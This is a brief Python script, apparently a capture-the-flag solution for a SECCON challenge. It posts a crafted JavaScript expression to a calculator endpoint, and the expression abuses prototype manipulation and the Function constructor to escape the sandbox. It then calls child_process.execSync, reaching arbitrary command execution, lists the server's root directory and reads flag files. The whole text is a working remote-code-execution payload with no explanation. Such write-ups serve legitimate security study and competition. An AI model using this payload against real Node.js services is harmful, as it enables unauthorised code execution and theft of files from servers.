import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"


def evaluate(command: str) -> str:
    res = httpx.post(
        f"{BASE_URL}/calc",
        json={
            "expr": f'o = constructor; o.assign(__proto__, o.getOwnPropertyDescriptor(o.getPrototypeOf(toString), "constructor")); f = value("return global.process.mainModule.constructor._load(`child_process`).execSync(`{command}`).toString()"); f()'
        },
    )
    return res.text


files = evaluate("ls /").splitlines()
for file in files:
    if file.startswith("flag-"):
        print(evaluate(f"cat /{file}"))
